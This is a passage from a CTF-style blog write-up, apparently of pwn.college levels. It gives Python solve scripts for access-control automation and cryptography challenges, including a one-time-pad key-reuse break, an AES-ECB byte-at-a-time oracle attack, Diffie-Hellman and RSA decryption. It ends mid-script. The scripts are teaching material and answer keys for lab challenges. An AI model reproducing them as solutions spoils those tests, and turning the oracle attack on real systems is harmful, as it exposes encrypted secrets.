p.sendline(<span class="hljs-string">b&#x27;no&#x27;</span>)<br>    feedback = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Incorrect&#x27;</span> <span class="hljs-keyword">in</span> feedback:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h4><blockquote>
<p>Automate answering 64 Mandatory Access Control questions with categories in one second</p>
</blockquote>
<p>same with levle17<br>同上</p>
<h4 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h4><blockquote>
<p>Automate Answering 128 Mandatory Access Control questions with random levels and categories in one second</p>
</blockquote>
<p>same with levle17<br>同上</p>
<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge"></a>challenge</h3><p>In this series of challenges, you will be working with various cryptographic mechanisms.</p>
<h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><blockquote>
<p>Decode base64-encoded data</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decode base64 data.<br>Despite base64 data appearing &quot;mangled&quot;, it is not an encryption scheme.<br>It is an encoding, much like base2, base10, base16, and ascii.<br>It is a popular way of encoding raw bytes.<br></code></pre></td></tr></table></figure>

<h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><blockquote>
<p>Decrypt a secret encrypted with a one-time pad, assuming a securely transferred key</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with a one-time pad.<br>Although simple, this is the most secure encryption mechanism, if you could just securely transfer the key.<br><br><br>key (b64): HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg==<br>secret ciphertext (b64): bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>key = <span class="hljs-string">&quot;HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg==&quot;</span><br>secret = <span class="hljs-string">&quot;bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA==&quot;</span><br><br>key = base64.b64decode(key)<br>secret = base64.b64decode(secret)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    flag+= <span class="hljs-built_in">chr</span>(secret[i]^key[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><blockquote>
<p>Decrypt a secret encrypted with a one-time pad, where the key is reused for arbitrary data</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with a one-time pad.<br>You can encrypt arbitrary data, with the key being reused each time.<br><br><br>secret ciphertext (b64): B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA==<br>plaintext (b64): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==<br>ciphertext (b64): dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>secret = <span class="hljs-string">&#x27;B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA==&#x27;</span><br>secret = base64.b64decode(secret)<br><br><span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-built_in">len</span>(secret)))<br><span class="hljs-comment"># AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==</span><br><br>key = <span class="hljs-string">&quot;dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg==&quot;</span><br>key = base64.b64decode(key)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    flag+= <span class="hljs-built_in">chr</span>(secret[i]^key[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><blockquote>
<p>Decrypt a secret encrypted with AES using the ECB mode of operation</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).<br>The Electronic Codebook (ECB) block cipher mode of operation is used.<br><br><br>key (b64): N0EJNox2NpWKmu2HM2bYRg==<br>secret ciphertext (b64): cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>key = <span class="hljs-string">&quot;N0EJNox2NpWKmu2HM2bYRg==&quot;</span><br>secret = <span class="hljs-string">&quot;cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w==&quot;</span><br>key = base64.b64decode(key)<br>secret = base64.b64decode(secret)<br><br>aes = AES.new(key, AES.MODE_ECB )<br><br><span class="hljs-built_in">print</span>(aes.decrypt(secret))<br></code></pre></td></tr></table></figure>

<h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><blockquote>
<p>Decrypt a secret encrypted with AES-ECB, where arbitrary data is appended to the secret and the key is reused. This level is quite a step up in difficulty (and future levels currently do not build on this level), so if you are completely stuck feel free to move ahead. Check out this lecture video on how to approach level 5.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).<br>The Electronic Codebook (ECB) block cipher mode of operation is used.<br>You can encrypt arbitrary data, which has the secret appended to it, with the key being reused each time.<br><br><br>secret ciphertext (b64): z+IDlVYk0Dn3Hclscr9Crl+FRhl/kopRq7U/Sgt9Y80FS/Hf/A1/fb+L4cCRMv48DQnUwESEGmMNfctJzVU7Vg==<br>secret ciphertext (hex): cfe203955624d039f71dc96c72bf42ae 5f8546197f928a51abb53f4a0b7d63cd 054bf1dffc0d7f7dbf8be1c09132fe3c 0d09d4c044841a630d7dcb49cd553b56<br>plaintext prefix (b64): <br><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>p = process(<span class="hljs-string">&quot;/challenge/run&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">plaintext</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;plaintext prefix (b64): &#x27;</span>)<br>    p.sendline(base64.b64encode(plaintext))<br>    p.recvuntil(<span class="hljs-string">b&#x27;ciphertext (b64): &#x27;</span>)<br>    cipher = base64.b64decode(p.recvline()[:-<span class="hljs-number">1</span>])<br>    p.recvuntil(<span class="hljs-string">b&#x27;ciphertext (hex): &#x27;</span>)<br>    hexcipher = (p.recvline()[:-<span class="hljs-number">2</span>].decode()).split(<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-keyword">return</span> cipher,hexcipher<br><br>secret = aes_encrypt(<span class="hljs-string">b&quot;&quot;</span>)<br>flag_len = <span class="hljs-built_in">len</span>(secret[<span class="hljs-number">0</span>])<br><br>padding_test = aes_encrypt(<span class="hljs-string">b&#x27;\x10&#x27;</span>*<span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> padding_test[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==secret[<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>]:<br>    flag_padding = <span class="hljs-number">16</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>):<br>        res = aes_encrypt(<span class="hljs-string">b&#x27;a&#x27;</span>*i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res[<span class="hljs-number">0</span>]) &gt; flag_len:<br>            flag_padding = i<br>            <span class="hljs-keyword">break</span><br><br>flag_len -= flag_padding<br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag_len):<br>    block = (i+<span class="hljs-number">1</span>)//<span class="hljs-number">16</span> + <span class="hljs-number">1</span><br>    target = aes_encrypt(<span class="hljs-string">b&#x27;a&#x27;</span>*(flag_padding+i+<span class="hljs-number">1</span>))<br>    round_success = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        senddata = <span class="hljs-built_in">chr</span>(j)+flag[:<span class="hljs-number">15</span>]<br>        senddata = pad(senddata.encode(),<span class="hljs-number">16</span>)<br>        res = aes_encrypt(senddata) <br>        <span class="hljs-keyword">if</span> res[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==target[<span class="hljs-number">1</span>][-block]:<br>            flag = <span class="hljs-built_in">chr</span>(j)+flag<br>            round_success = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> round_success==<span class="hljs-literal">False</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log.success(<span class="hljs-string">&quot;flag : &quot;</span> + flag)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><blockquote>
<p>Perform a Diffie-Hellman key exchange to establish a shared secret</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will perform a Diffie-Hellman key exchange.<br><br><br>p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff<br>g: 0x2<br>A: 0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7<br>B: 0xb53f64b421db954ff626bbe4e32e7673b9d94864be22af94ef01fc8e091b7d14d357818519fcb4a1ef388df179d1bbde84339af1b16d2aa5bc4435ce37dd229e694f3530285d4ff63f3c47b28548fb482b2c8a9a7e1c8b850d418514bf9581b181c79619ed0d6aabaf01936964f7a9a44581a3385193f3f013c8d6b0b26bcf0cb877d60b43557616c41750c8cf9af53fbf68c019786b99b36e53c3588136a08c3efa2f417cc165312aeddbee92a3206871fc73ad2eac5c19ae09c9e3499e879ff74b42792dc01618bff6569549027866717663cfa1e53b2713a2642fc5c6d6b50587c60879cb20189e50aeef85af3c794e059cd8250964e8c44d71a5e59fbd9d<br>secret ciphertext (b64): vvhJt4t2G/vdwh8xG5t+IYia0nFJD+p8gflyMkoEnVBHtYwshkPd3Ai35VrHMOSEH+qM/z8HlZP5EQ==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getRandomNBitInteger<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><span class="hljs-keyword">import</span> base64<br><br>p = <span class="hljs-number">0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br>g = <span class="hljs-number">0x2</span><br>A = <span class="hljs-number">0xc1c09760c9dedd93dc0a15fe9af7466b23591b379bd5f17f1482e015aac5ee0417b535c64a19096c56f9bd193daa37c27ce5a320484ad9f8b66a416da09d488f4244543c57e20e5e3cb3ce716d3b5a037bd95bd5ad9dc56fe18f829a877d1441deb8c5fdfb6576a94c63e166b98bda836895c7eec6d30672d739d3e6990e74fd931f5a4038dc7b4cba8d87c3c9a3cf09ff203a7e02ae297659b0b534229e859c1fc06b9a7cf41167386560aade7b5526ea4ce319ffe1c5c581925d72597ede72c9349069d8d25efd81e9e6ebe2a0c565ed173d0fff44089a73b82ce8352d98812274184ba6d49c0c13d8af240e75ddb1ab521fd2e069ca86cc46b3ad5cd0ac7</span><br>b = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>B = <span class="hljs-built_in">pow</span>(g,b,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(B))<br><br>b64chiper = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input b64chiper: &quot;</span>)<br>chiper = base64.b64decode(b64chiper)<br><br>s = <span class="hljs-built_in">pow</span>(A,b,p)<br>key = s.to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&quot;little&quot;</span>)<br><br>flag = strxor(chiper,key[:<span class="hljs-built_in">len</span>(chiper)])<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>

<h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><blockquote>
<p>Decrypt an RSA-encrypted secret using provided public and private keys</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).<br>You will be provided with both the public key and private key.<br><br><br>e: 0x10001<br>d: 0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81<br>n: 0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf<br>secret ciphertext (b64): fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-keyword">import</span> base64<br><br>e = <span class="hljs-number">0x10001</span><br>d = <span class="hljs-number">0x69c8e5572e7909a99ecf482a5d4a6c245ee3db5ffd2833fc1ea0421a43e75869d6c415a6b36ae666e11800b8e260dbd3b8cf268bfc592ecac73d02b1238be480abacfa57ad7e012aa2abf47b656572f04f09a9659406c13c2496d4e5828d6092b240156324c5813a4092c4d5d0ce662be7d8db7bd2ce5c41d5609ab8f906683a3f5632dc5394bdcf426a8439f513f82914ac343121f59fccef286f16998010a2922b5364207774137eab956608b239baf040b113fbec410945e92a9bfeff566b4b1c27a878622fc201f50cf5374acb42aa36dda5909b3b44bcf0c08b3dfbd3010c01c87c54e549563bf056bdb132b68c25a5ac82a37a10eaaf7302c8dbc29c81</span><br>n = <span class="hljs-number">0xe2794928683c255a7d1d31b03b50a984ed09046a0b3db9fd69a4265b1a8a415f7edcade6b853fa20a4d63c26f67b26bdb4a0285e38d7c8e7eeabafb3c8b6d7dd1426b8384359cdf67712d3678bdd8c5ff42cc2cfd7b1c4d0ea95341e91cda626c281c95e3fd46e1e5254cf557289aced59ec2872a7cee2dda8d8e58db2301cea181c71663bb3f5abdaae459fbc358a8d40340223c742a2b142b82eeeb53b12370f93e8bdf62a801bcc3e5a1ae8060bce87c033f3a573e65a984a301cabb29530256887c38ac69cece9abba3eac28dfb4ef1825c39295d2911dacb1bc06ae512f008bebe86b6fba9c074b481f6185a7be3e823cf577de0c8224fb788d32a736cf</span><br>b64cipher = <span class="hljs-string">&quot;fFFCmUmD42Qiesdwsm9RX6dqYjjQRyqBAtMbcnnPklcslRrnHx2JjguShjB8uFN6e+r9dq6okTRZIGax4dxau85Btmj457FviQm0+sUxdTw7mmQNEir29Q2+/VrJTsQ4oV2b1ITtlzLlfC8QVRV5Qmzh857ecrboiqvDh8sj6ye1IeepnPrLm0WS/WFJNFXeZJzvctBjzSSCMx6665VjwDZnlPctFH87zoKeMWgudDfTQ2ZKaZjul7GQsqegdV//u8z5T9auBaoEQCiskWYzJDMo+2n34x24TH3ml6aTY5InuEZNX7sFG/W4WMHOtbRRIwfWqLT7/cT9BEOfIkTrYA==&quot;</span><br><br>cipher = base64.b64decode(b64cipher)<br>c = bytes_to_long(cipher[::-<span class="hljs-number">1</span>])<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag = long_to_bytes(m)[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><blockquote>
<p>Decrypt an RSA-encrypted secret using the provided prime factors of n</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various cryptographic mechanisms.<br><br>In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).<br>You will be provided with the prime factors of n.<br><br><br>e: 0x10001<br>p: 0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45<br>q: 0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f<br>secret ciphertext (b64): fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA==<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x10001</span><br>p = <span class="hljs-number">0xeb0eedde9f594d1b111f52728bf67e5925bf2a3bae9a30c618ac2e74865d15b758e2462dcae46926dc7ea84f383c5d21df36a75e8236055ca4c07c77e798d801ed1ca516707e284e6b129762c7ba5e42591cceaf56f170bc530fb4fe6991120fb74cc1a7826a80ca43221822559d502ab25bb5d04516e02ae20a25aa03694e45</span><br>q = <span class="hljs-number">0xffb7dc5f2b9822aa854d05d9aaef7d3c84eae9cb826e78fe32d1498562e2b535931e6f49e05023ec423641f8fe850de5a7f8132d1856f2e018437c71b39e038a5e820e88db5fbe3d4a8c84a287e77d894ad3dfeffd92fa09b2c4353680130a105099b86b0d0ad71350951c3b67889ab9c1c8326d50e8f0a02b855e0a92f48d3f</span><br>b64cipher = <span 